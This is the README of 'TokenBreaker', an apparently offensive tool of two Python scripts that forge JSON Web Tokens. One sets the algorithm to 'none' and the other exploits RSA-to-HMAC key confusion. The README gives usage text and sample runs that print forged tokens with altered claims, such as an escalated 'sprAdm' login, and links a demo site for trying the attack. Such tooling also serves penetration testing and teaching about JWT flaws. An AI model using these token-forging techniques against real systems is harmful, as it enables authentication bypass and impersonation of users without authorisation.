# TokenBreaker

Token Breaker is focused on 2 particular vulnerability related to JWT tokens.

 - None Algorithm
 - RSAtoHMAC

Refer to [this](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/) link about insights of the vulnerability and how an attacker can forge the tokens

Try out this vulnerability [here](http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php?)

## TheNone Usage
```
usage: TheNone.py [-h] -t TOKEN

TokenBreaker: 1.TheNoneAlgorithm

optional arguments:
  -h, --help            show this help message and exit

required arguments:
  -t TOKEN, --token TOKEN
                        JWT Token value

Example Usage: python TheNone.py -t [JWTtoken]
```

### Output
```
$ ./TheNone.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImFkbSIsImlhdCI6IjE1Mzc1MjMxMjIifQ.ZWZhNjRmZDgzYWYzNDcxMjk5OTQ4YzE0NDVjMTNhZmJmYTQ5ZDhmYjY0ZDgyMzlhMjMwMGJlMTRhODA2NGU4MQ

TheNone

[*] Decoded Header value is: {"alg":"HS256","typ":"JWS"}
[*] Decoded Payload value is: {"login":"adm","iat":"1537523122"}
[*] New header value with none algorithm: {"alg":"None","typ":"JWS"}
[<] Modify Header? [y/N]: n
[<] Enter your payload: {"login":"sprAdm","iat":"0"}
[+] Successfully encoded Token: eyJhbGciOiJOb25lIiwidHlwIjoiSldTIn0.eyJsb2dpbiI6InNwckFkbSIsImlhdCI6IjAifQ.
```

## RSAtoHMAC Usage
```
usage: RsaToHmac.py [-h] -t TOKEN -p PUBKEY

TokenBreaker: 1.RSAtoHMAC

optional arguments:
  -h, --help                        show this help message and exit

required arguments:
  -t TOKEN, --token TOKEN           JWT Token value
  -p PUBKEY, --pubkey PUBKEY        Path to Public key File

Example Usage: python RsatoHMAC.py -t [JWTtoken] -p [PathtoPublickeyfile]
```

### Output
```
$ ./RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU0MDM3NjA2MSwiZXhwIjoxNTQwMzc2MTgxLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.HI50KvoHzcf7znWkrdugn5-O-68PpJAeiS21cLisC1WgEI21gWnqqvv3oqsnzbGkIt21NvPVHWFXoKJmLPKHeMeYLgc7nuVdF37WWd7M1XzZEP8zLoed7Z6K0KfNuR_CRsjogv1KAt8fJQvRzRhFi9dORHGxWRqpiInIgLKROLgXB-7Rv2SOYdyD_XylRaVJ1JpmmCyVmIbzVWhVuRJWT59AUm43yYRP3bBt-bnhMfkzFpwxTk3O84-On4DoIt6NIkRJaxXDUdDKscLGmSWQmdZsZds3XSV0ZgN0PObADqkZwwCBAqUTT7l5BVcBmasdnNuZ8cCDKzNtJr2cdow6zQ -p public.pem

RSA to HMAC

[*] Decoded Header value: {"typ":"JWT","alg":"RS256"}
[*] Decode Payload value: {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1540376061,"exp":1540376181,"data":{"hello":"world"}}
[*] New header value with HMAC: {"typ":"JWT","alg":"HS256"}
[<] Modify Header? [y/N]: n
[<] Enter Your Payload value: {"iss":"http:\/\/www.google.com\/","iat":2351287873,"exp":1843945693,"data":{"hello":"hacked!"}}
[+] Successfully Encoded Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC93d3cuZ29vZ2xlLmNvbVwvIiwiaWF0IjoyMzUxMjg3ODczLCJleHAiOjE4NDM5NDU2OTMsImRhdGEiOnsiaGVsbG8iOiJoYWNrZWQhIn19.8jfUVCZPA7cWaSfe0LIjRt692RaFHnnvtw0jHoSAneQ
```
